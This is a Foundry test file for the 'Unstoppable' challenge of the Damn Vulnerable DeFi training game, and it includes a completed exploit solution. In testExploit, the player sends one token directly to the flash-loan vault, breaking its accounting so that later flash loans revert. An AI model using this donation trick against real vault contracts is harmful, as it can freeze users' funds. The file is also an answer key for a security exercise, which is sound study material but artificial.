// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../Util.sol";
import {UnstoppableVault} from "../../src/unstoppable/UnstoppableVault.sol";
import {ReceiverUnstoppable} from "../../src/unstoppable/ReceiverUnstoppable.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ERC20} from "solmate/mixins/ERC4626.sol";

contract UnstoppableTest is Test {
    uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 internal constant INITIAL_PLAYER_TOKEN_BALANCE = 100e18;

    Util internal util;

    UnstoppableVault public vault;
    DamnValuableToken public token;
    ReceiverUnstoppable public receiverUnstoppable;

    address payable internal deployer;
    address payable internal player;
    address payable internal someUser;

    function setUp() public {
        // create user address
        util = new Util();
        address payable[] memory users = util.createUsers(3);
        deployer = users[0];
        player = users[1];
        someUser = users[2];

        // deploy token and vault contract
        token = new DamnValuableToken();
        vault = new UnstoppableVault(ERC20(token), deployer, deployer);

        // vm label
        vm.label(address(token),"DVT Token");
        vm.label(address(vault),"UnstoppableVault");

        vm.label(address(deployer),"deployer");
        vm.label(address(player),"player");
        vm.label(address(someUser),"someUser");

        // transfer token to vault
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);

        // assert
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1e18), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50_000e18);

        // transfer token to player
        token.transfer(address(player), INITIAL_PLAYER_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(player)), INITIAL_PLAYER_TOKEN_BALANCE);

        // possible to execute flashloan
        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(address(vault));
        receiverUnstoppable.executeFlashLoan(100e18);
        vm.stopPrank();
    }

    function testExploit() public{
        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        token.transfer(address(vault), 1);
        vm.stopPrank();
        /* */
        vm.expectRevert();
        validation();
        console.log(unicode"\n🎉 Congratulations, pass all tests! 🎉");
    }

    function validation() internal{
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(100e18);
        vm.stopPrank();
    }
}
